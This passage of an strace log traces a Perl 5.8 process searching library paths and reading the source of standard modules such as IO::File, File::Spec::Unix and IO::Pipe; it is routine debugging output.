7444  07:18:47.747546 stat64("/etc/perl/IO/File.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.747560 stat64("/etc/perl/IO/File.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.747574 stat64("/usr/local/lib/perl/5.8.8/IO/File.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.747587 stat64("/usr/local/lib/perl/5.8.8/IO/File.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.747600 stat64("/usr/local/share/perl/5.8.8/IO/File.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.747613 stat64("/usr/local/share/perl/5.8.8/IO/File.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.747626 stat64("/usr/lib/perl5/IO/File.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.747638 stat64("/usr/lib/perl5/IO/File.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.747651 stat64("/usr/share/perl5/IO/File.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.747662 stat64("/usr/share/perl5/IO/File.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.747675 stat64("/usr/lib/perl/5.8/IO/File.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.747688 stat64("/usr/lib/perl/5.8/IO/File.pm", {st_mode=S_IFREG|0644, st_size=1784, ...}) = 0
7444  07:18:47.747708 open("/usr/lib/perl/5.8/IO/File.pm", O_RDONLY|O_LARGEFILE) = 6
7444  07:18:47.747723 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff5d1d8) = -1 ENOTTY (Inappropriate ioctl for device)
7444  07:18:47.747734 _llseek(6, 0, [0], SEEK_CUR) = 0
7444  07:18:47.747761 read(6, "#\n\npackage IO::File;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO::Seekable;\nuse File::Spec;\n\nrequire Exporter;\n\n@ISA = qw(IO::Handle IO::Seekable Exporter);\n\n$VERSION = \"1.13\";\n\n@EXPORT = @IO::Seekable::EXPORT;\n\neval {\n    # Make all Fcntl O_XXX constants available for importing\n    require Fcntl;\n    my @O = grep /^O_/, @Fcntl::EXPORT;\n    Fcntl->import(@O);  # first we import what we want to export\n    push(@EXPORT, @O);\n};\n\n################################################\n## Constructor\n##\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::File\";\n    @_ >= 0 && @_ <= 3\n\tor croak \"usage: new $class [FILENAME [,MODE [,PERMS]]]\";\n    my $fh = $class->SUPER::new();\n    if (@_) {\n\t$fh->open(@_)\n\t    or return undef;\n    }\n    $fh;\n}\n\n################################################\n## Open\n##\n\nsub open {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $fh->open(FILENAME [,MODE [,PERMS]])\';\n    my ($fh, $file) = @_;\n    if (@_ > 2) {\n\tmy ($mode, $perms) = @_[2, 3];\n\tif ($mode =~ /^\\d+$/) {\n\t    defined $perms or $perms = 0666;\n\t    return sysopen($fh, $file, $mode, $perms);\n\t} elsif ($mode =~ /:/) {\n\t    return open($fh, $mode, $file) if @_ == 3;\n\t    croak \'usage: $fh->open(FILENAME, IOLAYERS)\';\n\t}\n\tif (defined($file) && length($file)\n\t    && ! File::Spec->file_name_is_absolute($file))\n\t{\n\t    $file = File::Spec->rel2abs($file);\n\t}\n\t$file = IO::Handle::_open_mode_string($mode) . \" $file\\0\";\n    }\n    open($fh, $file);\n}\n\n################################################\n## Binmode\n##\n\nsub binmode {\n    ( @_ == 1 or @_ == 2 ) or croak \'usage $fh->binmode([LAYER])\';\n\n    my($fh, $layer) = @_;\n\n    return binmode $$fh unless $layer;\n    return binmode $$fh, $layer;\n}\n\n1;\n", 4096) = 1784
7444  07:18:47.748102 stat64("/etc/perl/File/Spec.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.748118 stat64("/etc/perl/File/Spec.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.748132 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.748144 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.748158 stat64("/usr/local/share/perl/5.8.8/File/Spec.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.748171 stat64("/usr/local/share/perl/5.8.8/File/Spec.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.748185 stat64("/usr/lib/perl5/File/Spec.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.748196 stat64("/usr/lib/perl5/File/Spec.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.748209 stat64("/usr/share/perl5/File/Spec.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.748221 stat64("/usr/share/perl5/File/Spec.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.748234 stat64("/usr/lib/perl/5.8/File/Spec.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.748247 stat64("/usr/lib/perl/5.8/File/Spec.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.748302 stat64("/usr/share/perl/5.8/File/Spec.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.748315 stat64("/usr/share/perl/5.8/File/Spec.pm", {st_mode=S_IFREG|0644, st_size=595, ...}) = 0
7444  07:18:47.748370 open("/usr/share/perl/5.8/File/Spec.pm", O_RDONLY|O_LARGEFILE) = 8
7444  07:18:47.748384 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff5cd28) = -1 ENOTTY (Inappropriate ioctl for device)
7444  07:18:47.748395 _llseek(8, 0, [0], SEEK_CUR) = 0
7444  07:18:47.748413 read(8, "package File::Spec;\n\nuse strict;\nuse vars qw(@ISA $VERSION);\n\n$VERSION = \'3.12\';\n$VERSION = eval $VERSION;\n\nmy %module = (MacOS   => \'Mac\',\n\t      MSWin32 => \'Win32\',\n\t      os2     => \'OS2\',\n\t      VMS     => \'VMS\',\n\t      epoc    => \'Epoc\',\n\t      NetWare => \'Win32\', # Yes, File::Spec::Win32 works on NetWare.\n\t      symbian => \'Win32\', # Yes, File::Spec::Win32 works on symbian.\n\t      dos     => \'OS2\',   # Yes, File::Spec::OS2 works on DJGPP.\n\t      cygwin  => \'Cygwin\');\n\nmy $module = $module{$^O} || \'Unix\';\n\nrequire \"File/Spec/$module.pm\";\n@ISA = (\"File::Spec::$module\");\n\n1;\n\n__END__\n\n", 4096) = 595
7444  07:18:47.748486 stat64("/etc/perl/vars.pmc", 0xbff5cb5c) = -1 ENOENT (No such file or directory)
7444  07:18:47.748499 stat64("/etc/perl/vars.pm", 0xbff5ca6c) = -1 ENOENT (No such file or directory)
7444  07:18:47.748512 stat64("/usr/local/lib/perl/5.8.8/vars.pmc", 0xbff5cb5c) = -1 ENOENT (No such file or directory)
7444  07:18:47.748524 stat64("/usr/local/lib/perl/5.8.8/vars.pm", 0xbff5ca6c) = -1 ENOENT (No such file or directory)
7444  07:18:47.748538 stat64("/usr/local/share/perl/5.8.8/vars.pmc", 0xbff5cb5c) = -1 ENOENT (No such file or directory)
7444  07:18:47.748551 stat64("/usr/local/share/perl/5.8.8/vars.pm", 0xbff5ca6c) = -1 ENOENT (No such file or directory)
7444  07:18:47.748565 stat64("/usr/lib/perl5/vars.pmc", 0xbff5cb5c) = -1 ENOENT (No such file or directory)
7444  07:18:47.748576 stat64("/usr/lib/perl5/vars.pm", 0xbff5ca6c) = -1 ENOENT (No such file or directory)
7444  07:18:47.748589 stat64("/usr/share/perl5/vars.pmc", 0xbff5cb5c) = -1 ENOENT (No such file or directory)
7444  07:18:47.748601 stat64("/usr/share/perl5/vars.pm", 0xbff5ca6c) = -1 ENOENT (No such file or directory)
7444  07:18:47.748613 stat64("/usr/lib/perl/5.8/vars.pmc", 0xbff5cb5c) = -1 ENOENT (No such file or directory)
7444  07:18:47.748625 stat64("/usr/lib/perl/5.8/vars.pm", 0xbff5ca6c) = -1 ENOENT (No such file or directory)
7444  07:18:47.748638 stat64("/usr/share/perl/5.8/vars.pmc", 0xbff5cb5c) = -1 ENOENT (No such file or directory)
7444  07:18:47.748653 stat64("/usr/share/perl/5.8/vars.pm", {st_mode=S_IFREG|0644, st_size=1149, ...}) = 0
7444  07:18:47.748673 open("/usr/share/perl/5.8/vars.pm", O_RDONLY|O_LARGEFILE) = 10
7444  07:18:47.748687 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff5c878) = -1 ENOTTY (Inappropriate ioctl for device)
7444  07:18:47.748698 _llseek(10, 0, [0], SEEK_CUR) = 0
7444  07:18:47.748714 read(10, "package vars;\n\nuse 5.006;\n\nour $VERSION = \'1.01\';\n\nuse warnings::register;\nuse strict qw(vars subs);\n\nsub import {\n    my $callpack = caller;\n    my ($pack, @imports) = @_;\n    my ($sym, $ch);\n    foreach (@imports) {\n        if (($ch, $sym) = /^([\\$\\@\\%\\*\\&])(.+)/) {\n\t    if ($sym =~ /\\W/) {\n\t\t# time for a more-detailed check-up\n\t\tif ($sym =~ /^\\w+[[{].*[]}]$/) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"Can\'t declare individual elements of hash or array\");\n\t\t} elsif (warnings::enabled() and length($sym) == 1 and $sym !~ tr/a-zA-Z//) {\n\t\t    warnings::warn(\"No need to declare built-in vars\");\n\t\t} elsif  (($^H &= strict::bits(\'vars\'))) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"\'$_\' is not a valid variable name under strict vars\");\n\t\t}\n\t    }\n\t    $sym = \"${callpack}::$sym\" unless $sym =~ /::/;\n\t    *$sym =\n\t\t(  $ch eq \"\\$\" ? \\$$sym\n\t\t : $ch eq \"\\@\" ? \\@$sym\n\t\t : $ch eq \"\\%\" ? \\%$sym\n\t\t : $ch eq \"\\*\" ? \\*$sym\n\t\t : $ch eq \"\\&\" ? \\&$sym \n\t\t : do {\n\t\t     require Carp;\n\t\t     Carp::croak(\"\'$_\' is not a valid variable name\");\n\t\t });\n\t} else {\n\t    require Carp;\n\t    Carp::croak(\"\'$_\' is not a valid variable name\");\n\t}\n    }\n};\n\n1;\n__END__\n\n", 4096) = 1149
7444  07:18:47.749047 stat64("/etc/perl/warnings/register.pmc", 0xbff5c6ac) = -1 ENOENT (No such file or directory)
7444  07:18:47.749248 stat64("/etc/perl/warnings/register.pm", 0xbff5c5bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.749340 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pmc", 0xbff5c6ac) = -1 ENOENT (No such file or directory)
7444  07:18:47.749389 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pm", 0xbff5c5bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.749423 stat64("/usr/local/share/perl/5.8.8/warnings/register.pmc", 0xbff5c6ac) = -1 ENOENT (No such file or directory)
7444  07:18:47.749449 stat64("/usr/local/share/perl/5.8.8/warnings/register.pm", 0xbff5c5bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.749473 stat64("/usr/lib/perl5/warnings/register.pmc", 0xbff5c6ac) = -1 ENOENT (No such file or directory)
7444  07:18:47.749486 stat64("/usr/lib/perl5/warnings/register.pm", 0xbff5c5bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.749500 stat64("/usr/share/perl5/warnings/register.pmc", 0xbff5c6ac) = -1 ENOENT (No such file or directory)
7444  07:18:47.749512 stat64("/usr/share/perl5/warnings/register.pm", 0xbff5c5bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.749525 stat64("/usr/lib/perl/5.8/warnings/register.pmc", 0xbff5c6ac) = -1 ENOENT (No such file or directory)
7444  07:18:47.749538 stat64("/usr/lib/perl/5.8/warnings/register.pm", 0xbff5c5bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.749552 stat64("/usr/share/perl/5.8/warnings/register.pmc", 0xbff5c6ac) = -1 ENOENT (No such file or directory)
7444  07:18:47.749564 stat64("/usr/share/perl/5.8/warnings/register.pm", {st_mode=S_IFREG|0644, st_size=732, ...}) = 0
7444  07:18:47.749585 open("/usr/share/perl/5.8/warnings/register.pm", O_RDONLY|O_LARGEFILE) = 11
7444  07:18:47.749600 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff5c3c8) = -1 ENOTTY (Inappropriate ioctl for device)
7444  07:18:47.749611 _llseek(11, 0, [0], SEEK_CUR) = 0
7444  07:18:47.749629 read(11, "package warnings::register;\n\nour $VERSION = \'1.01\';\n\nrequire warnings;\n\nsub mkMask\n{\n    my ($bit) = @_;\n    my $mask = \"\";\n\n    vec($mask, $bit, 1) = 1;\n    return $mask;\n}\n\nsub import\n{\n    shift;\n    my $package = (caller(0))[0];\n    if (! defined $warnings::Bits{$package}) {\n        $warnings::Bits{$package}     = mkMask($warnings::LAST_BIT);\n        vec($warnings::Bits{\'all\'}, $warnings::LAST_BIT, 1) = 1;\n        $warnings::Offsets{$package}  = $warnings::LAST_BIT ++;\n\tforeach my $k (keys %warnings::Bits) {\n\t    vec($warnings::Bits{$k}, $warnings::LAST_BIT, 1) = 0;\n\t}\n        $warnings::DeadBits{$package} = mkMask($warnings::LAST_BIT);\n        vec($warnings::DeadBits{\'all\'}, $warnings::LAST_BIT++, 1) = 1;\n    }\n}\n\n1;\n", 4096) = 732
7444  07:18:47.749831 read(11, "", 4096) = 0
7444  07:18:47.749844 close(11)         = 0
7444  07:18:47.750035 _llseek(10, 1148, [1148], SEEK_SET) = 0
7444  07:18:47.750051 _llseek(10, 0, [1148], SEEK_CUR) = 0
7444  07:18:47.750061 close(10)         = 0
7444  07:18:47.750129 _llseek(8, 594, [594], SEEK_SET) = 0
7444  07:18:47.750143 _llseek(8, 0, [594], SEEK_CUR) = 0
7444  07:18:47.750152 close(8)          = 0
7444  07:18:47.750304 stat64("/etc/perl/File/Spec/Unix.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.750339 stat64("/etc/perl/File/Spec/Unix.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.750373 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.750405 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.750441 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.750473 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.750504 stat64("/usr/lib/perl5/File/Spec/Unix.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.750535 stat64("/usr/lib/perl5/File/Spec/Unix.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.750585 stat64("/usr/share/perl5/File/Spec/Unix.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.750614 stat64("/usr/share/perl5/File/Spec/Unix.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.750663 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.750721 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pm", 0xbff5cf1c) = -1 ENOENT (No such file or directory)
7444  07:18:47.750804 stat64("/usr/share/perl/5.8/File/Spec/Unix.pmc", 0xbff5d00c) = -1 ENOENT (No such file or directory)
7444  07:18:47.750818 stat64("/usr/share/perl/5.8/File/Spec/Unix.pm", {st_mode=S_IFREG|0644, st_size=7038, ...}) = 0
7444  07:18:47.750856 open("/usr/share/perl/5.8/File/Spec/Unix.pm", O_RDONLY|O_LARGEFILE) = 8
7444  07:18:47.750872 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff5cd28) = -1 ENOTTY (Inappropriate ioctl for device)
7444  07:18:47.750883 _llseek(8, 0, [0], SEEK_CUR) = 0
7444  07:18:47.750903 read(8, "package File::Spec::Unix;\n\nuse strict;\nuse vars qw($VERSION);\n\n$VERSION = \'1.5\';\n\nsub canonpath {\n    my ($self,$path) = @_;\n    \n    # Handle POSIX-style node names beginning with double slash (qnx, nto)\n    # Handle network path names beginning with double slash (cygwin)\n    # (POSIX says: \"a pathname that begins with two successive slashes\n    # may be interpreted in an implementation-defined manner, although\n    # more than two leading slashes shall be treated as a single slash.\")\n    my $node = \'\';\n    if ( $^O =~ m/^(?:qnx|nto|cygwin)$/ && $path =~ s:^(//[^/]+)(/|\\z):/:s ) {\n      $node = $1;\n    }\n    # This used to be\n    # $path =~ s|/+|/|g unless($^O eq \'cygwin\');\n    # but that made tests 29, 30, 35, 46, and 213 (as of #13272) to fail\n    # (Mainly because trailing \"\" directories didn\'t get stripped).\n    # Why would cygwin avoid collapsing multiple slashes into one? --jhi\n    $path =~ s|/+|/|g;                             # xx////xx  -> xx/xx\n    $path =~ s@(/\\.)+(/|\\Z(?!\\n))@/@g;             # xx/././xx -> xx/xx\n    $path =~ s|^(\\./)+||s unless $path eq \"./\";    # ./xx      -> xx\n    $path =~ s|^/(\\.\\./)+|/|;                      # /../../xx -> xx\n    $path =~ s|^/\\.\\.$|/|;                         # /..       -> /\n    $path =~ s|/\\Z(?!\\n)|| unless $path eq \"/\";          # xx/       -> xx\n    return \"$node$path\";\n}\n\nsub catdir {\n    my $self = shift;\n\n    $self->canonpath(join(\'/\', @_, \'\')); # \'\' because need a trailing \'/\'\n}\n\nsub catfile {\n    my $self = shift;\n    my $file = $self->canonpath(pop @_);\n    return $file unless @_;\n    my $dir = $self->catdir(@_);\n    $dir .= \"/\" unless substr($dir,-1) eq \"/\";\n    return $dir.$file;\n}\n\nsub curdir () { \'.\' }\n\nsub devnull () { \'/dev/null\' }\n\nsub rootdir () { \'/\' }\n\nmy $tmpdir;\nsub _tmpdir {\n    return $tmpdir if defined $tmpdir;\n    my $self = shift;\n    my @dirlist = @_;\n    {\n\tno strict \'refs\';\n\tif (${\"\\cTAINT\"}) { # Check for taint mode on perl >= 5.8.0\n            require Scalar::Util;\n\t    @dirlist = grep { ! Scalar::Util::tainted($_) } @dirlist;\n\t}\n    }\n    foreach (@dirlist) {\n\tnext unless defined && -d && -w _;\n\t$tmpdir = $_;\n\tlast;\n    }\n    $tmpdir = $self->curdir unless defined $tmpdir;\n    $tmpdir = defined $tmpdir && $self->canonpath($tmpdir);\n    return $tmpdir;\n}\n\nsub tmpdir {\n    return $tmpdir if defined $tmpdir;\n    $tmpdir = $_[0]->_tmpdir( $ENV{TMPDIR}, \"/tmp\" );\n}\n\nsub updir () { \'..\' }\n\nsub no_upwards {\n    my $self = shift;\n    return grep(!/^\\.{1,2}\\Z(?!\\n)/s, @_);\n}\n\nsub case_tolerant () { 0 }\n\nsub file_name_is_absolute {\n    my ($self,$file) = @_;\n    return scalar($file =~ m:^/:s);\n}\n\nsub path {\n    return () unless exists $ENV{PATH};\n    my @path = split(\':\', $ENV{PATH});\n    foreach (@path) { $_ = \'.\' if $_ eq \'\' }\n    return @path;\n}\n\nsub join {\n    my $self = shift;\n    return $self->catfile(@_);\n}\n\nsub splitpath {\n    my ($self,$path, $nofile) = @_;\n\n    my ($volume,$directory,$file) = (\'\',\'\',\'\');\n\n    if ( $nofile ) {\n        $directory = $path;\n    }\n    else {\n        $path =~ m|^ ( (?: .* / (?: \\.\\.?\\Z(?!\\n) )? )? ) ([^/]*) |xs;\n        $directory = $1;\n        $file      = $2;\n    }\n\n    return ($volume,$directory,$file);\n}\n\nsub splitdir {\n    return split m|/|, $_[1], -1;  # Preserve trailing fields\n}\n\nsub catpath {\n    my ($self,$volume,$directory,$file) = @_;\n\n    if ( $directory ne \'\'                && \n         $file ne \'\'                     && \n         substr( $directory, -1 ) ne \'/\' && \n         substr( $file, 0, 1 ) ne \'/\' \n    ) {\n        $directory .= \"/$file\" ;\n    }\n    else {\n        $directory .= $file ;\n    }\n\n    return $directory ;\n}\n\nsub abs2rel {\n    my($self,$path,$base) = @_;\n\n    # Figure out the effective $base and clean it up.\n    if ( !defined( $base ) || $base eq \'\' ) {\n        $base = $self->_cwd();\n    }\n    elsif ( ! $self->file_name_is_absolute( $base ) ) {\n\tif ( ! $self->file_name_is_absolute( $path ) ) {\n\t    # optimisation where both paths are relative: save 2 x cwd\n\t    $base = $self->canonpath( \"/$base\" );\n\t    $path = \"/$path\";\n\t}\n\telse {\n\t    $base = $self->rel2abs( $base ) ;\n\t}\n    }\n  ", 4096) = 4096
7444  07:18:47.752085 brk(0x8218000)    = 0x8218000
7444  07:18:47.752214 read(8, "  else {\n        $base = $self->canonpath( $base ) ;\n    }\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        $path = $self->rel2abs( $path ) ;\n    }\n    else {\n        $path = $self->canonpath( $path ) ;\n    }\n\n    # Now, remove all leading components that are the same\n    my @pathchunks = $self->splitdir( $path);\n    my @basechunks = $self->splitdir( $base);\n\n    while (@pathchunks && @basechunks && $pathchunks[0] eq $basechunks[0]) {\n        shift @pathchunks ;\n        shift @basechunks ;\n    }\n\n    $path = CORE::join( \'/\', @pathchunks );\n    $base = CORE::join( \'/\', @basechunks );\n\n    # $base now contains the directories the resulting relative path \n    # must ascend out of before it can descend to $path_directory.  So, \n    # replace all names with $parentDir\n    $base =~ s|[^/]+|..|g ;\n\n    # Glue the two together, using a separator if necessary, and preventing an\n    # empty result.\n    if ( $path ne \'\' && $base ne \'\' ) {\n        $path = \"$base/$path\" ;\n    } else {\n        $path = \"$base$path\" ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\nsub rel2abs {\n    my ($self,$path,$base ) = @_;\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        # Figure out the effective $base and clean it up.\n        if ( !defined( $base ) || $base eq \'\' ) {\n\t    $base = $self->_cwd();\n        }\n        elsif ( ! $self->file_name_is_absolute( $base ) ) {\n            $base = $self->rel2abs( $base ) ;\n        }\n        else {\n            $base = $self->canonpath( $base ) ;\n        }\n\n        # Glom them together\n        $path = $self->catdir( $base, $path ) ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\n# Internal routine to File::Spec, no point in making this public since\n# it is the standard Cwd interface.  Most of the platform-specific\n# File::Spec subclasses use this.\nsub _cwd {\n    require Cwd;\n    Cwd::cwd();\n}\n\n# Internal method to reduce xx\\..\\yy -> yy\nsub _collapse {\n    my($fs, $path) = @_;\n\n    my $updir  = $fs->updir;\n    my $curdir = $fs->curdir;\n\n    my($vol, $dirs, $file) = $fs->splitpath($path);\n    my @dirs = $fs->splitdir($dirs);\n\n    my @collapsed;\n    foreach my $dir (@dirs) {\n        if( $dir eq $updir              and   # if we have an updir\n            @collapsed                  and   # and something to collapse\n            length $collapsed[-1]       and   # and its not the rootdir\n            $collapsed[-1] ne $updir    and   # nor another updir\n            $collapsed[-1] ne $curdir         # nor the curdir\n          ) \n        {                                     # then\n            pop @collapsed;                   # collapse\n        }\n        else {                                # else\n            push @collapsed, $dir;            # just hang onto it\n        }\n    }\n\n    return $fs->catpath($vol,\n                        $fs->catdir(@collapsed),\n                        $file\n                       );\n}\n\n1;\n", 4096) = 2942
7444  07:18:47.752663 read(8, "", 4096) = 0
7444  07:18:47.752678 close(8)          = 0
7444  07:18:47.752925 read(6, "", 4096) = 0
7444  07:18:47.752941 close(6)          = 0
7444  07:18:47.753108 stat64("/etc/perl/IO/Pipe.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.753124 stat64("/etc/perl/IO/Pipe.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.753138 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.753151 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.753165 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.753178 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.753191 stat64("/usr/lib/perl5/IO/Pipe.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.753203 stat64("/usr/lib/perl5/IO/Pipe.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.753216 stat64("/usr/share/perl5/IO/Pipe.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.753228 stat64("/usr/share/perl5/IO/Pipe.pm", 0xbff5d3cc) = -1 ENOENT (No such file or directory)
7444  07:18:47.753254 stat64("/usr/lib/perl/5.8/IO/Pipe.pmc", 0xbff5d4bc) = -1 ENOENT (No such file or directory)
7444  07:18:47.753311 stat64("/usr/lib/perl/5.8/IO/Pipe.pm", {st_mode=S_IFREG|0644, st_size=3426, ...}) = 0
7444  07:18:47.753333 open("/usr/lib/perl/5.8/IO/Pipe.pm", O_RDONLY|O_LARGEFILE) = 6
7444  07:18:47.753349 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff5d1d8) = -1 ENOTTY (Inappropriate ioctl for device)
7444  07:18:47.753361 _llseek(6, 0, [0], SEEK_CUR) = 0
7444  07:18:47.753383 read(6, "# IO::Pipe.pm\n#\n# Copyright (c) 1996-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Pipe;\n\nuse 5.006_001;\n\nuse IO::Handle;\nuse strict;\nour($VERSION);\nuse Carp;\nuse Symbol;\n\n$VERSION = \"1.13\";\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::Pipe\";\n    @_ == 0 || @_ == 2 or croak \"usage: new $class [READFH, WRITEFH]\";\n\n    my $me = bless gensym(), $class;\n\n    my($readfh,$writefh) = @_ ? @_ : $me->handles;\n\n    pipe($readfh, $writefh)\n\tor return undef;\n\n    @{*$me} = ($readfh, $writefh);\n\n    $me;\n}\n\nsub handles {\n    @_ == 1 or croak \'usage: $pipe->handles()\';\n    (IO::Pipe::End->new(), IO::Pipe::End->new());\n}\n\nmy $do_spawn = $^O eq \'os2\' || $^O eq \'MSWin32\';\n\nsub _doit {\n    my $me = shift;\n    my $rw = shift;\n\n    my $pid = $do_spawn ? 0 : fork();\n\n    if($pid) { # Parent\n        return $pid;\n    }\n    elsif(defined $pid) { # Child or spawn\n        my $fh;\n        my $io = $rw ? \\*STDIN : \\*STDOUT;\n        my ($mode, $save) = $rw ? \"r\" : \"w\";\n        if ($do_spawn) {\n          require Fcntl;\n          $save = IO::Handle->new_from_fd($io, $mode);\n\t  my $handle = shift;\n          # Close in child:\n\t  unless ($^O eq \'MSWin32\') {\n            fcntl($handle, Fcntl::F_SETFD(), 1) or croak \"fcntl: $!\";\n\t  }\n          $fh = $rw ? ${*$me}[0] : ${*$me}[1];\n        } else {\n          shift;\n          $fh = $rw ? $me->reader() : $me->writer(); # close the other end\n        }\n        bless $io, \"IO::Handle\";\n        $io->fdopen($fh, $mode);\n\t$fh->close;\n\n        if ($do_spawn) {\n          $pid = eval { system 1, @_ }; # 1 == P_NOWAIT\n          my $err = $!;\n    \n          $io->fdopen($save, $mode);\n          $save->close or croak \"Cannot close $!\";\n          croak \"IO::Pipe: Cannot spawn-NOWAIT: $err\" if not $pid or $pid < 0;\n          return $pid;\n        } else {\n          exec @_ or\n            croak \"IO::Pipe: Cannot exec: $!\";\n        }\n    }\n    else {\n        croak \"IO::Pipe: Cannot fork: $!\";\n    }\n\n    # NOT Reached\n}\n\nsub reader {\n    @_ >= 1 or croak \'usage: $pipe->reader( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[0];\n    my $pid;\n    $pid = $me->_doit(0, $fh, @_)\n        if(@_);\n\n    close ${*$me}[1];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"r\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\nsub writer {\n    @_ >= 1 or croak \'usage: $pipe->writer( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[1];\n    my $pid;\n    $pid = $me->_doit(1, $fh, @_)\n        if(@_);\n\n    close ${*$me}[0];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"w\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\npackage 